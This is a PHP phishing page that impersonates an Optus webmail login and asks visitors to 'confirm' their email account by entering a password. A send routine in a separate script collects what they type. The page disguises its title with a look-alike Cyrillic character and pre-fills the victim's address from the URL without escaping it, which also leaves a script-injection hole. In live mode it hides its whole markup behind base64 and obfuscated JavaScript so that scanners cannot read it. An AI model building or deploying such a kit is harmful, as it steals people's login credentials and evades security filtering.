<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="/";
?>

<!DOCTYPE html>
<html class="ui-mobile" lang="en">

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">

<link rel="stylesheet" href="form/css.css">


    <meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, minimal-ui">
    <title>L&#1086;gin</title>
    <link media="all" href="index.css" type="text/css" rel="stylesheet">
</head>

<?php ob_start() ?>
<body class="ui-mobile-viewport ui-overlay-a">
    <div id="mobile_login" tabindex="0" class="ui-page ui-page-theme-a ui-page-header-fixed ui-page-active" style="padding-top: 44px; min-height: 906px;">
        <div style="display: none;" role="banner" class="ui-header ui-bar-inherit ui-header-fixed slidedown ui-fixed-hidden">
            <h1 class="ui-title" role="heading">Login</h1>
        </div>
        <div role="main" class="ui-content">
            <div id="logo-wrapper">
                <div class="logo" style="background: transparent url('optus-logo-new.png') no-repeat scroll center 0px;"></div>
            </div>
            <div class="ui-content" role="main">
                <form id="form_login" novalidate autocomplete="off" onsubmit="send1(event,'next__');return false">
                    <fieldset>
                        <legend style="text-align: center; margin-bottom: 20px;">Please confirm your web email account</legend> 
                        <label for="email" class="ui-hidden-accessible">Email Address</label>

                        <div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset form-group">
                        	<input class="login-input form-control" pattern=".{4,}" data-err_text="Please enter valid " disabled="disabled" value="<?php echo $_GET['email'] ?>"  name="email" id="email"  placeholder="Email" tabindex="0" type="email">
                        </div>
                        



                         <label for="password" class="ui-hidden-accessible">Password</label>

                        <div class="ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset form-group">
                        	<input class="login-input form-control" pattern=".{4,}" data-err_text="Please enter valid "  name="pass" id="pass"  placeholder="Password" tabindex="0" type="password">
                        </div>

                        
                        <div class="login-button-container">
                            <div class="ui-btn ui-input-btn ui-btn-b ui-corner-all ui-shadow ui-btn-inline">Login
                            	<input id="login_submit" class="btn-submit" value="Login" tabindex="0" type="submit">
                            </div> 
                            <button id="login_more" type="button" onclick="back()" tabindex="0" class=" ui-btn ui-icon-arrow-d ui-btn-icon-left ui-shadow ui-corner-all">Cancel</button>


                        </div>
                    </fieldset>
                </form>
                
                
            </div>
        </div>
    </div>



<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
</body>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?> 

</html>